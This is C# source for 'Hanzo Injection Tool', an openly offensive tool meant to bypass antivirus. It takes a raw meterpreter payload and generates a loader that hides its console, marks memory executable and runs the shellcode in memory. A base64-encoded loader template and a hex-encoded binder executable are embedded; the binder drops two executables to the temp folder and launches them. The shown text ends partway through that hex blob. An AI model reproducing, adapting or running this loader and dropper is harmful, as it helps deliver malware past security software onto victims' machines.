/*
 * -----------------------------------------------------------------------------------------------
 * Hanzo Injetion Tool 
 * the HanzoIjection is a tool focused on injecting arbitrary codes in memory to bypass common antivirus solutions
 * Geeetx: P0cL4bs Team
 * { N4sss , MMXM , Chrislley, MovCode, joridos }
 * Create in: 11/10/2014
 * copyright 
 * 
 *------------------------------------------------------------------------------------------------
*/
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Globalization;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Threading;
using System.Linq;
using System.Text.RegularExpressions;
using System.Security.Cryptography;

namespace HanzoInjectionTool
{
    class Principal
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("user32.dll")]
        static extern bool SetWindowText(IntPtr hWnd, string windowName);

        public delegate uint Ret1ArgDelegate(uint address);
        static uint PlaceHolder1(uint arg1) { return 0; }
        

        public static byte[] Payload_remoto(string nomedoarquivo)
        {
            using (Stream meu_arquivo = new FileStream(Environment.CurrentDirectory + "/" +nomedoarquivo,
           FileMode.Open))
            {
                Console.WriteLine("1237674423894");
                var tamanho = meu_arquivo.Length;
                var byteshexa = new byte[tamanho];
                meu_arquivo.Read(byteshexa, 0, (int)tamanho);
                return byteshexa;
            }
        }

        public static byte[] lerpayload(string nome_arquivo)
        {
            using (Stream meu_arquivo = new FileStream(Environment.CurrentDirectory + "/" +nome_arquivo,
           FileMode.Open))
            {
                var tamanho = meu_arquivo.Length;
                var byteshexa = new byte[tamanho];
                meu_arquivo.Read(byteshexa, 0, (int)tamanho);
                return byteshexa;
            }
        }

        public static void memoria_execute(string payload, string nome_arquivo) 
        {
            string arquivo = "dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJlZmxlY3Rpb247DQp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7DQp1c2luZyBTeXN0ZW0uVGV4dDsNCnVza"+
                "W5nIFN5c3RlbS5HbG9iYWxpemF0aW9uOw0KdXNpbmcgU3lzdGVtLklPOw0KdXNpbmcgU3lzdGVtLk5ldDsNCnVzaW5nIFN5c3RlbS5MaW5xOw0KdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOw0KdXN"+
                "pbmcgU3lzdGVtLlRocmVhZGluZzsNCnVzaW5nIFN5c3RlbS5YbWw7DQpuYW1lc3BhY2UgRXhwbG9pdFNoZWxsY29kZUV4ZWMNCnsNCiAgICBjbGFzcyBQcm9ncmFtDQogICAgew0KICAgICAgICBbR"+
                "GxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgLy9bRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0NCiAgICAgICAgc3RhdGljIGV4dGVybiBib29"+
                "sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIHVpbnQgZHdTaXplLCB1aW50IGZsTmV3UHJvdGVjdCwgb3V0IHVpbnQgbHBmbE9sZFByb3RlY3QpOw0KICAgICAgICBwdWJsaWMgZGVsZ"+
                "WdhdGUgdWludCBSZXQxQXJnRGVsZWdhdGUodWludCBhZGRyZXNzKTsNCiAgICAgICAgc3RhdGljIHVpbnQgUGxhY2VIb2xkZXIxKHVpbnQgYXJnMSkgeyByZXR1cm4gMDsgfQ0KICAgICAgICBbRGx"+
                "sSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0NCiAgICAgICAgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0Q29uc29sZVdpbmRvdygpOw0KDQogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0NC"+
                "iAgICAgICAgc3RhdGljIGV4dGVybiBib29sIFNob3dXaW5kb3coSW50UHRyIGhXbmQsIGludCBuQ21kU2hvdyk7DQoNCiAgICAgICAgY29uc3QgaW50IFNXX0hJREUgPSAwOw0KICAgICAgICBjb25"+
                "zdCBpbnQgU1dfU0hPVyA9IDU7DQogICAgICAgIHB1YmxpYyBzdGF0aWMgYnl0ZVtdIGxlcnBheWxvYWQoc3RyaW5nIG5vbWVfYXJxdWl2bykNCiAgICAgICAgew0KICAgICAgICAgICAgdXNpbmcgK"+
                "FN0cmVhbSBtZXVfYXJxdWl2byA9IG5ldyBGaWxlU3RyZWFtKEVudmlyb25tZW50LkN1cnJlbnREaXJlY3RvcnkgKyAiLyIgK25vbWVfYXJxdWl2bywNCiAgICAgICAgICAgRmlsZU1vZGUuT3Blbik"+
                "pDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIHRhbWFuaG8gPSBtZXVfYXJxdWl2by5MZW5ndGg7DQogICAgICAgICAgICAgICAgdmFyIGJ5dGVzaGV4YSA9IG5ldyBieXRlW3Rhb"+
                "WFuaG9dOw0KICAgICAgICAgICAgICAgIG1ldV9hcnF1aXZvLlJlYWQoYnl0ZXNoZXhhLCAwLCAoaW50KXRhbWFuaG8pOw0KICAgICAgICAgICAgICAgIHJldHVybiBieXRlc2hleGE7DQogICAgICA"+
                "gICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICB1bnNhZmUgc3RhdGljIHZvaWQgTWFpbihzdHJpbmdbXSBhcmdzKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgaGFuZGxlID0gR2V0Q29uc"+
                "29sZVdpbmRvdygpOw0KDQogICAgICAgICAgICAvLyBIaWRlDQogICAgICAgICAgICBTaG93V2luZG93KGhhbmRsZSwgU1dfSElERSk7DQogICAgICAgICAgICBzdHJpbmcgaGV4YUJpbnBheWxvYWQ"+
                "gPSAibWluaGFfc3RyaW5nIjsNCiAgICAgICAgICAgIGJ5dGVbXSBzaGVsbGNvZGVoZXggPSBIZXhTdHJpbmdUb0J5dGVBcnJheShoZXhhQmlucGF5bG9hZCk7DQogICAgICAgICAgICBDb25zb2xlL"+
                "ldyaXRlTGluZSgiZXhjdXRhbmRvLi4uIik7DQogICAgICAgICAgICBleGVjdXRhcihzaGVsbGNvZGVoZXgpOw0KICAgICAgICB9DQoNCiAgICAgICAgIHB1YmxpYyBzdGF0aWMgYnl0ZVtdIEhleFN"+
                "0cmluZ1RvQnl0ZUFycmF5KHN0cmluZyBIZXgpDQogICAgICAgIHsNCiAgICAgICAgICAgIGJ5dGVbXSBCeXRlcyA9IG5ldyBieXRlW0hleC5MZW5ndGggLyAyXTsNCiAgICAgICAgICAgIGludFtdI"+
                "HZhbG9yZXMgPSBuZXcgaW50W10geyAweDAwLCAweDAxLCAweDAyLCAweDAzLCAweDA0LCAweDA1LCANCiAgICAgICAweDA2LCAweDA3LCAweDA4LCAweDA5LCAweDAwLCAweDAwLCAweDAwLCAweDA"+
                "wLCAweDAwLCAweDAwLCAweDAwLCANCiAgICAgICAweDBBLCAweDBCLCAweDBDLCAweDBELCAweDBFLCAweDBGIH07DQoNCiAgICAgICAgICAgIGZvciAoaW50IHggPSAwLCBpID0gMDsgaSA8IEhle"+
                "C5MZW5ndGg7IGkgKz0gMiwgeCArPSAxKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIEJ5dGVzW3hdID0gKGJ5dGUpKHZhbG9yZXNbQ2hhci5Ub1VwcGVyKEhleFtpICsgMF0pIC0gJzA"+
                "nXSA8PCA0IHwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YWxvcmVzW0NoYXIuVG9VcHBlcihIZXhbaSArIDFdKSAtICcwJ10pOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgI"+
                "CAgICByZXR1cm4gQnl0ZXM7DQogICAgICAgIH0NCg0KICAgICAgICB1bnNhZmUgcHVibGljIHN0YXRpYyB2b2lkIGV4ZWN1dGFyKGJ5dGVbXSBhc21CeXRlcykNCiAgICAgICAgew0KICAgICAgICA"+
                "gICAgZml4ZWQgKGJ5dGUqIHN0YXJ0QWRkcmVzcyA9ICZhc21CeXRlc1swXSkgDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgLy8gcGVnYW5kbyBmZWlsZGluZm8gZG8gbcOpdG9kbyAiX"+
                "21ldGhvZFB0ciINCiAgICAgICAgICAgICAgICBUeXBlIGRlbFR5cGUgPSB0eXBlb2YoRGVsZWdhdGUpOw0KICAgICAgICAgICAgICAgIEZpZWxkSW5mbyBfbWV0aG9kUHRyID0gZGVsVHlwZS5HZXR"+
                "GaWVsZCgiX21ldGhvZFB0ciIsIEJpbmRpbmdGbGFncy5Ob25QdWJsaWMgfA0KICAgICAgICAgICAgICAgQmluZGluZ0ZsYWdzLkluc3RhbmNlKTsNCiAgICAgICAgICAgICAgICAvLyByZXQgZGVsZ"+
                "WdhZXRlDQogICAgICAgICAgICAgICAgUmV0MUFyZ0RlbGVnYXRlIGRlbCA9IG5ldyBSZXQxQXJnRGVsZWdhdGUoUGxhY2VIb2xkZXIxKTsNCiAgICAgICAgICAgICAgICBfbWV0aG9kUHRyLlNldFZ"+
                "hbHVlKGRlbCwgKEludFB0cilzdGFydEFkZHJlc3MpOw0KICAgICAgICAgICAgICAgIC8vZGVzYWJpbGl0YXIgYSBwcm90ZcOnw6NvIA0KICAgICAgICAgICAgICAgIHVpbnQgb3V0T2xkUHJvdGVjd"+
                "GlvbjsNCiAgICAgICAgICAgICAgICBWaXJ0dWFsUHJvdGVjdCgoSW50UHRyKXN0YXJ0QWRkcmVzcywgKHVpbnQpYXNtQnl0ZXMuTGVuZ3RoLCAweDQwLCBvdXQgb3V0T2xkUHJvdGVjdGlvbik7DQo"+
                "gICAgICAgICAgICAgICAgLy8gZXhldHV0YXIgc2hlbGxjb2RlDQogICAgICAgICAgICAgICAgdWludCBuID0gKHVpbnQpMHgwMDAwMDAwMTsNCiAgICAgICAgICAgICAgICBuID0gZGVsKG4pOw0KI"+
                "CAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJ7MDp4fSIsIG4pOw0KICAgICAgICAgICAgICAgIENvbnNvbGUuUmVhZEtleSgpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgIH0NCiA"+
                "gICB9DQp9DQo=";
            string adicionar_bytes_encode = Base64Decode(arquivo);
            byte[] arquivoBytes = File.ReadAllBytes(payload);
            string payload_encode = ByteArrayToHexString(arquivoBytes);
            string arquivo_final = adicionar_bytes_encode.Replace("minha_string", payload_encode);
            string rcode = "dWludCBvdXRPbGRQcm90ZWN0aW9uOw0KICAgICAgICAgICAgICAgIFZpcnR1YWxQcm90ZWN0"+
                "KChJbnRQdHIpc3RhcnRBZGRyZXNzLCAodWludClhc21CeXRlcy5MZW5ndGgsIDB4NDAsIG91dCBvdXRPbGR"+
                "Qcm90ZWN0aW9uKTsNCiAgICAgICAgICAgICAgICAvLyBleGV0dXRhciBzaGVsbGNvZGUNCiAgICAgICAgIC"+
                "AgICAgICB1aW50IG4gPSAodWludCkweDAwMDAwMDAxOw0KICAgICAgICAgICAgICAgIG4gPSBkZWwobik7D"+
                "QogICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoInswOnh9Iiwgbik7DQogICAgICAgICAgICAg"+
                "ICAgQ29uc29sZS5SZWFkS2V5KCk7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgfQ0KICAgIH0NCn0=";
            string final = Base64Decode(rcode);
            System.IO.StreamWriter file = new System.IO.StreamWriter(nome_arquivo);
            file.Write(arquivo_final += "/*" + rcode);
            file.Write("*/");
            file.Close();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("[!] ");
            Console.ResetColor();
            Console.WriteLine("Output: " + nome_arquivo);
            Console.WriteLine("[!] Payload: " + payload);
            Console.WriteLine("[#] Encoding: Hex Decoder");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.Write("[!] ");
            Console.ResetColor();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("Path:" + Directory.GetCurrentDirectory() + @"\" + nome_arquivo );
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("[!] ");
            Console.ResetColor();
            Console.WriteLine("Len: " + arquivo_final.Length);
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("[*] ");
            Console.ResetColor();
            Console.WriteLine("Generated file with success!");
            Console.ResetColor();

        }

        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }

        public static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }
        
        public static void modo_de_uso() 
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("Usage: HanzoInjection.exe [Options] [-h] [-e] [-o] [-p] [-b]\n");
            Console.ResetColor();
            Console.WriteLine("the HanzoIjection is a tool focused on injecting arbitrary codes in memory to bypass common antivirus solutions. \n");
            Console.WriteLine("Developer: Mharcos Nesster (mh4x0f)");
            Console.WriteLine("Email:mh4root@gmail.com");
            Console.WriteLine("Site: www.chmodsecurity.com.br\n");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Greetx:  P0cL4bs Team { N4sss , MMXM , Chrislley, MovCode, joridos } ");
            Console.ResetColor();
            Console.WriteLine("-------------------------------------------------------------------\n\n");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine("Arguments Options:\n");
            Console.ResetColor();
            Console.WriteLine("        OPTION        TYPE       DESCRIPTION");
            Console.WriteLine("       -e,--execute  [.raw]      Name of file.bin, payload metasploit type raw");
            Console.WriteLine("       -p,--payload  [.raw]      Payload meterpreter type [RAW]  requered parameter -o [output]");
            Console.WriteLine("       -o,--output   [file.cs]   Output generate project file.cs injection memory payload c#");
            Console.WriteLine("       -b,--binder   [NULL]      Binder File  EXE  with encrypt file PE not requered paramenter");
            Console.WriteLine("       -h,--help     [Help]      show this help and exit");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine("\nExample Usage:\n");
            Console.ResetColor();
            Console.WriteLine("        HanzoInjection.exe -e payload_meterpreter.bin");
            Console.WriteLine("        HanzoInjection.exe -p meterpreter.bin -o injection_memory.cs");
            Console.WriteLine("        HanzoInjection.exe -b ");
        }
        unsafe static void Main(string[] args)
        {
            
            if (args.Length == 0)
            {
                modo_de_uso();
            }
            if (args.Length == 1)
            {
                
                if (args.Contains("-h") || (args.Contains("--help")))
                {
                    modo_de_uso();
                }

            }
            if (args.Length == 1)
            {
                 if (args.Contains("-b") || args.Contains("--binder"))
                {
                    string hanzobinder = "4D5A90000300000004000000FFFF0000B80000000000000040000000000000000000000000000000000000000000000000"+
                        "0000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696"+
                        "E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300DEE703540000000000000000E00002010B010B00003600000008000000"+
                     "000000BE54000000200000006000000000400000200000000200000400000000000000060000000000000000A00000000200000000000002006085000"+
                     "01000001000000000100000100000000000001000000000000000000000006C5400004F000000006000007005000000000000000000000000000000000000008000000C000000345300001"+
                     "C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000800000000000000000000000820000048000000000000000000000"+
                     "02E74657874000000C4340000002000000036000000020000000000000000000000000000200000602E72737263000000700500000060000000060000003800000000000000000000000000"+
                     "00400000402E72656C6F6300000C0000000080000000020000003E00000000000000000000000000004000004200000000000000000000000000000000A0540000000000004800000002000"+
                     "50060380000D41A0000030002000D000006982D0000C80A0000000000000000000000000000000000000000000000000000000000000000000000000000000000006202147D030000040228"+
                     "1100000A000002280C00000600002A00000013300400630000000100001100028E69185A731200000A0A72010000700B000213041613052B2F11041105910C000607081A636F1300000A6F1"+
                     "400000A260607081F0F5F6F1300000A6F1400000A2600110517581305110511048E69FE04130611062DC3066F1500000A0D2B00092A0013300200620000000200001100731600000A0A0672"+
                     "230000706F1700000A00066F1800000A17FE0116FE010C082D3E00027B0A000004066F1900000A6F1A00000A0002066F1900000A7D01000004027B01000004281B00000A0B027B0C0000040"+
                     "728020000066F1A00000A00002A000013300200620000000200001100731600000A0A0672230000706F1700000A00066F1800000A17FE0116FE010C082D3E00027B09000004066F1900000A"+
                     "6F1A00000A0002066F1900000A7D02000004027B02000004281B00000A0B027B0D0000040728020000066F1A00000A00002A0000133002002700000003000011007273000070731C00000A0"+
                     "A0672870000706F1D00000A00066F1E00000A00066F1F00000A002A00133002002D0000000300001100720A010070731C00000A0A06027B0B0000046F2000000A6F2100000A00066F1E0000"+
                     "0A00066F1F00000A002A62007273000070282200000A00720A010070282200000A002A000013300200310000000400001100732300000A0A732400000A0B07176F2500000A0007727300007"+
                     "06F2600000A0006076F2700000A00066F2800000A262A00000013300300970000000500001100027B01000004281B00000A0A027B02000004281B00000A0B0628020000060C072802000006"+
                     "0D027B0B0000046F2000000A13041104721E010070086F2900000A130511057230010070096F2900000A1306027B0B00000411066F1A00000A0002280600000600022805000006000228080"+
                     "00006007242010070282A00000A7280010070282B00000A282C00000A26022807000006002A2200282D00000A002A133002002C0000000600001100032C0B027B0300000414FE012B011700"+
                     "0A062D0E00027B030000046F2E00000A00000203282F00000A002A13300400570900000700001100D002000002283000000A733100000A0A02733200000A7D0400000402733200000A7D050"+
                     "0000402733300000A7D0600000402733200000A7D0800000402733400000A7D0900000402733400000A7D0A00000402731600000A7D0700000402733500000A7D0B00000402733500000A7D"+
                     "0C00000402733500000A7D0D00000402733300000A7D0E00000402733300000A7D0F00000402733200000A7D1000000402733300000A7D1100000402733600000A7D12000004027B0600000"+
                     "46F3700000A00027B0E0000046F3700000A00027B0F0000046F3700000A00027B110000046F3700000A0002283700000A00027B04000004283800000A6F3900000A00027B04000004166F3A"+
                     "00000A00027B0400000420F10000001F0A733B00000A6F3C00000A00027B0400000472940100706F3D00000A00027B040000041F1C1F15733E00000A6F3F00000A00027B04000004166F400"+
                     "0000A00027B0400000472AE0100706F1A00000A00027B04000004166F4100000A00027B0400000402FE0603000006734200000A6F4300000A00027B05000004283800000A6F3900000A000"+
                     "27B05000004166F3A00000A00027B0500000420130100001E733B00000A6F3C00000A00027B0500000472B60100706F3D00000A00027B050000041F451F2F733E00000A6F3F00000A00027"+
                     "B05000004186F4000000A00027B0500000472D00100706F1A00000A00027B05000004166F4100000A00027B0500000402FE0609000006734200000A6F4300000A00027B060000046F44000"+
                     "00A027B080000046F4500000A00027B060000046F4400000A027B050000046F4500000A00027B060000046F4400000A027B090000046F4500000A00027B060000046F4400000A027B0A00"+
                     "00046F4500000A00027B060000046F4400000A027B040000046F4500000A00027B060000041F0A1F12733B00000A6F3C00000A00027B0600000472E00100706F3D00000A00027B0600000"+
                     "4205D0100001F3B733E00000A6F3F00000A00027B06000004196F4000000A00027B06000004166F4600000A00027B08000004283800000A6F3900000A00027B08000004166F3A00000A000"+
                     "27B0800000420F10000001F21733B00000A6F3C00000A00027B0800000472F40100706F3D00000A00027B080000041F1C1F17733E00000A6F3F00000A00027B080000041D6F4000000A0002"+
                     "7B0800000472AE0100706F1A00000A00027B08000004166F4100000A00027B0800000402FE0604000006734200000A6F4300000A00027B09000004284700000A6F3900000A00027B090000"+
                     "041B1F24733B00000A6F3C00000A00027B09000004720E0200706F3D00000A00027B0900000420E60000001F14733E00000A6F3F00000A00027B090000041C6F4000000A00027B0A0000042"+
                     "84700000A6F3900000A00027B0A0000041B1F0A733B00000A6F3C00000A00027B0A00000472220200706F3D00000A00027B0A00000420E60000001F14733E00000A6F3F00000A00027B0A00"+
                     "00041B6F4000000A00027B0700000472360200706F4800000A00027B0B000004284700000A6F3900000A00027B0B000004166F4900000A00027B0B00000420C90100001F0C733B00000A6F3C"+
                     "00000A00027B0B00000472560200706F3D00000A00027B0B000004205D0100002022010000733E00000A6F3F00000A00027B0B0000041A6F4000000A00027B0B00000406726C0200706F4A0"+
                     "0000A6F1A00000A00027B0C000004284700000A6F3900000A00027B0C000004166F4900000A00027B0C000004284B00000A6F4C00000A00027B0C0000041B1F0E733B00000A6F3C00000A00"+
                     "027B0C000004728C0200706F3D00000A00027B0C00000420510100001F4A733E00000A6F3F00000A00027B0C0000041B6F4000000A00027B0C00000472A60200706F1A00000A00027B0D000"+
                     "004284700000A6F3900000A00027B0D000004166F4900000A00027B0D000004284B00000A6F4C00000A00027B0D0000041C1F0F733B00000A6F3C00000A00027B0D00000472A80200706F3D"+
                     "00000A00027B0D00000420510100001F4F733E00000A6F3F00000A00027B0D0000041C6F4000000A00027B0D00000472A60200706F1A00000A00027B0E0000046F4400000A027B0D0000046"+
                     "F4500000A00027B0E000004283800000A6F4C00000A00027B0E0000041F0920B6000000733B00000A6F3C00000A00027B0E00000472C20200706F3D00000A00027B0E000004205D0100001F"+
                     "64733E00000A6F3F00000A00027B0E0000041D6F4000000A00027B0E000004166F4600000A00027B0E00000472D60200706F1A00000A00027B0F0000046F4400000A027B0C0000046F45000"+
                     "00A00027B0F000004283800000A6F4C00000A00027B0F0000041F091F51733B00000A6F3C00000A00027B0F00000472EC0200706F3D00000A00027B0F000004205D0100001F5E733E00000"+
                     "A6F3F00000A00027B0F0000041E6F4000000A00027B0F000004166F4600000A00027B0F00000472D60200706F1A00000A00027B10000004166F3A00000A00027B1000000420430100001FF"+
                     "B733B00000A6F3C00000A00027B1000000472000300706F3D00000A00027B100000041F1B1F17733E00000A6F3F00000A00027B100000041F096F4000000A00027B1000000472100300706"+
                     "F1A00000A00027B10000004176F4100000A00027B1000000402FE060A000006734200000A6F4300000A00027B110000046F4400000A027B0F0000046F4500000A00027B110000046F44000"+
                     "00A027B0E0000046F4500000A00027B110000046F4400000A027B100000046F4500000A00027B11000004284D00000A6F4C00000A00027B11000004181A733B00000A6F3C00000A00027B1"+
                     "100000472140300706F3D00000A00027B11000004206C0100002021010000733E00000A6F3F00000A00027B110000041F0A6F4000000A00027B11000004166F4600000A00027B110000047"+
                     "2280300706F1A00000A0002220000C0402200005041734E00000A284F00000A000217285000000A00021F401F401F40285100000A6F3900000A000220720100002029010000733E00000A"+
                     "285200000A0002284400000A027B0B0000046F4500000A0002284400000A027B060000046F4500000A0002284400000A027B110000046F4500000A000216285300000A000272560300702"+
                     "83D00000A000217285400000A0002726A0300706F1A00000A00027B06000004166F5500000A00027B060000046F5600000A00027B0E000004166F5500000A00027B0F000004166F55000"+
                     "00A00027B11000004166F5500000A000216285500000A002A6A00285800000A0016285900000A007301000006285A00000A002A2A02285E00000A0000002A000000133002003C000000"+
                     "08000011007E1300000414FE0116FE010C082D22007284030070D004000002283000000A6F5F00000A736000000A0A068013000004007E130000040B2B00072A133001000B000000090"+
                     "00011007E140000040A2B00062A22000280140000042A133001000B0000000A000011007E150000040A2B00062A567313000006286200000A740500000280150000042A1E0228630000"+
                     "0A2A000000000000000A0A0000CECAEFBE01000000910000006C53797374656D2E5265736F75726365732E5265736F757263655265616465722C206D73636F726C69622C20566572736"+
                     "96F6E3D342E302E302E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D623737613563353631393334653038392353797374656D2E5265736F75"+
                     "726365732E52756E74696D655265736F75726365536574020000000100000000000000504144504144505C2DD86200000000DF0000001E520074006E005F0073006F007500720063006"+
                     "5002E0054006500780074000000000001A8127573696E672053797374656D3B0A7573696E672053797374656D2E5265666C656374696F6E3B0A7573696E672053797374656D2E546578"+
                     "743B0A7573696E672053797374656D2E476C6F62616C697A6174696F6E3B0A7573696E672053797374656D2E494F3B0A7573696E672053797374656D2E4E65743B0A7573696E6720537"+
                     "97374656D2E4C696E713B0A7573696E672053797374656D2E446961676E6F73746963733B0A7573696E672053797374656D2E52756E74696D652E496E7465726F70536572766963657"+
                     "33B0A6E616D657370616365204578706C6F69745368656C6C636F6465457865630A7B0A20202020636C6173732050726F6772616D0A202020207B0A20202020202020205B446C6C496"+
                     "D706F727428226B65726E656C33322E646C6C22295D0A20202020202020207374617469632065787465726E20496E7450747220476574436F6E736F6C6557696E646F7728293B0A0A202"+
                     "02020202020205B446C6C496D706F727428227573657233322E646C6C22295D0A20202020202020207374617469632065787465726E20626F6F6C2053686F7757696E646F7728496E74"+
                     "5074722068576E642C20696E74206E436D6453686F77293B0A0A2020202020202020636F6E737420696E742053575F48494445203D20303B0A2020202020202020636F6E737420696E7"+
                     "42053575F53484F57203D20353B0A20202020202020207075626C69632073746174696320766F696420696E6A657461726D656D656F72696128627974655B5D2062696E290A20202020"+
                     "202020207B0A2020202020202020202020200A202020202020202020202020417373656D626C792061203D20417373656D626C792E4C6F61642862696E293B0A2020202020202020202"+
                     "020202F2F206368616D61206F20656E747279706F696E740A2020202020202020202020204D6574686F64496E666F206D6574686F64203D20612E456E747279506F696E743B0A202020"+
                     "202020202020202020696620286D6574686F6420213D206E756C6C290A2020202020202020202020207B0A202020202020202020202020202020206F626A656374206F203D20612E437"+
                     "265617465496E7374616E6365286D6574686F642E4E616D65293B0A202020202020202020202020202020202F2F20696E766F63617220656E747279506F696E740A2020202020202020"+
                     "20202020202020206D6574686F642E496E766F6B65286F2C206E756C6C293B0A2020202020202020202020207D0A0A20202020202020207D0A0A2020202020202020207374617469632"+
                     "0766F6964204D61696E28737472696E675B5D2061726773290A20202020202020207B0A2020202020202020202020207661722068616E646C65203D20476574436F6E736F6C6557696E"+
                     "646F7728293B0A0A2020202020202020202020202F2F20486964650A20202020202020202020202053686F7757696E646F772868616E646C652C2053575F48494445293B0A202020202"+
                     "020202020202020737472696E67206865786142696E7061796C6F616431203D20226D657566696C6531223B0A202020202020202020202020737472696E67206865786142696E706179"+
                     "6C6F616432203D20226D657566696C6532223B0A202020202020202020202020627974655B5D207368656C6C636F646568657831203D20486578537472696E67546F427974654172726"+
                     "179286865786142696E7061796C6F616431293B0A202020202020202020202020627974655B5D207368656C6C636F646568657832203D20486578537472696E67546F42797465417272"+
                     "6179286865786142696E7061796C6F616432293B0A202020202020202020202020737472696E672074656D70203D20506174682E47657454656D705061746828293B0A0A20202020202"+
                     "020202020202046696C652E5772697465416C6C42797465732874656D70202B20225C5C22202B202262696E6172696F312E657865222C207368656C6C636F646568657831293B0A2020"+
                     "2020202020202020202046696C652E5772697465416C6C42797465732874656D70202B20225C5C22202B202262696E6172696F322E657865222C207368656C6C636F646568657832293"+
                     "B0A20202020202020202020202050726F636573732E53746172742874656D70202B20225C5C22202B202262696E6172696F312E65786522293B0A20202020202020202020202050726F"+
                     "636573732E53746172742874656D70202B20225C5C22202B202262696E6172696F322E65786522293B0A2020202020202020202020200A2020202020202020202020202F2F696E6A657"+
                     "461726D656D656F726961287368656C6C636F646568657831293B0A20202020202020207D0A0A0A2020202020202020207075626C69632073746174696320627974655B5D2048657853"+
                     "7472696E67546F42797465417272617928737472696E6720486578290A20202020202020207B0A202020202020202020202020627974655B5D204279746573203D206E6577206279746"+
                     "55B4865782E4C656E677468202F20325D3B0A202020202020202020202020696E745B5D2048657856616C7565203D206E657720696E745B5D207B20307830302C20307830312C203078"+
                     "30322C20307830332C20307830342C20307830352C200A20202020202020307830362C20307830372C20307830382C20307830392C20307830302C20307830302C20307830302C20307"+
                     "830302C20307830302C20307830302C20307830302C200A20202020202020307830412C20307830422C20307830432C20307830442C20307830452C2030783046207D3B0A0A20202020"+
                     "2020202020202020666F722028696E742078203D20302C2069203D20303B2069203C204865782E4C656E6774683B2069202B3D20322C2078202B3D2031290A202020202020202020202"+
                     "0207B0A2020202020202020202020202020202042797465735B785D203D202862797465292848657856616C75655B436861722E546F5570706572284865785B69202B20305D29202D20"+
                     "2730275D203C3C2034207C0A2020202020202020202020202020202020202020202020202020202020202020202048657856616C75655B436861722E546F5570706572284865785B692"+
                     "02B20315D29202D202730275D293B0A2020202020202020202020207D0A0A20202020202020202020202072657475726E2042797465733B0A20202020202020207D0A0A202020202020"+
                     "20200A202020207D0A7D0A0000B4000000CECAEFBE01000000910000006C53797374656D2E5265736F75726365732E5265736F757263655265616465722C206D73636F726C69622C20"+
                     "56657273696F6E3D342E302E302E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D623737613563353631393334653038392353797374656D2E5"+
                     "265736F75726365732E52756E74696D655265736F7572636553657402000000000000000000000050414450414450B400000042534A4201000100000000000C00000076342E302E33"+
                     "303331390000000005006C000000C8070000237E000034080000580B000023537472696E6773000000008C130000D0030000235553005C1700001000000023475549440000006C170"+
                     "0006803000023426C6F6200000000000000020000015715A2010901000000FA25330016000001000000480000000500000015000000140000000B00000063000000160000000A000"+
                     "00002000000030000000400000001000000040000000200000000000A00010000000000060083006E000A00980091000E00B4009F000A00F90091000E00890173010600BB016E000600"+
                     "DC016E000600EF016E0006001B026E00060037026E0006008E026E000A00C302B2020A00F402DF020A00A10387030A00CC03BA030A00E303BA030A000004BA030A001F04BA030A003804"+
                     "BA030A005104BA030A006C04BA030A008704BA030A00BF04A0040A00D304A0040A00E104BA030A00FA04BA030A002A0517056F003E0500000A006D054D050A008D054D050A00B705AB0"+
                     "50A00C50591000600E6056E000600FC056E00060009066E0006002E066E000A0049063F060A005B063F060A0068063F060E00990617050E00A10617050E00B20617050A00FE06910006"+
                     "0026076E00060036076E000A00470791000A00530791000A00580791000E007C0773011200B207A3071200BF07A3070600E5076E000600F0076E0012000808A30712002408A3070A005"+
                     "B0891009300720800000600B5086E000600C1086E0012002109A307060027096E00060050096E00060088096E000600AC096E000A00EB0991000E004F0A370A0A00660A17050A00830A"+
                     "4D050A009E0ABA030E00B40A73010E00CD0A73010E00E90A9F000000000001000000000001000100010010001E0028000500010001008001100038002800090013000D0000001000400"+
